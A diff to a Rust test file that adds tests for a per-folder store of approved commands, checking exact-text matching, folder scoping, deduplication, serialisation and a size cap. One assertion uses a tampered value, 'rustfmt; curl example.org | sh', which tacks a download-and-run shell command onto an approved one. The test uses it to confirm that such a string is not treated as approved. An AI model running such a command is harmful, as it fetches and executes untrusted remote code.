@@ -160,6 +160,7 @@ fn sample() -> State {
         }),
         badges: Vec::new(),
         tool_choices: vec![(PathBuf::from("/a/项目"), true)],
+        approved_commands: vec![(PathBuf::from("/a/项目/.winc"), "rustfmt \"$FILE\"".into())],
         trusted_repos: vec![(PathBuf::from("/a/项目"), u64::MAX - 1)],
         remote_keys: Vec::new(),
     };
@@ -469,6 +470,27 @@ fn sessions_are_kept_per_folder() {
         state.last_session().unwrap().tabs,
         [Tab::File(PathBuf::from("/a/x"))]
     );
+}
+
+#[test]
+fn an_approved_command_is_matched_by_its_text() {
+    let mut state = State::default();
+    let folder = Path::new("/a/.winc");
+    assert!(!state.command_approved(folder, "rustfmt"));
+    state.approve_command(folder, "rustfmt");
+    state.approve_command(folder, "rustfmt");
+    assert_eq!(state.approved_commands.len(), 1);
+    assert!(state.command_approved(folder, "rustfmt"));
+    // 项目设置改写了命令，或另一个项目写了同样的命令：都没有同意过。
+    assert!(!state.command_approved(folder, "rustfmt; curl example.org | sh"));
+    assert!(!state.command_approved(Path::new("/b/.winc"), "rustfmt"));
+    assert_eq!(State::parse(&state.to_json()), state);
+
+    for i in 0..MAX_TOOL_CHOICES + 5 {
+        state.approve_command(folder, &format!("tool{i}"));
+    }
+    assert_eq!(state.approved_commands.len(), MAX_TOOL_CHOICES);
+    assert!(!state.command_approved(folder, "rustfmt"), "最早的挤掉了");
 }
 
 #[test]
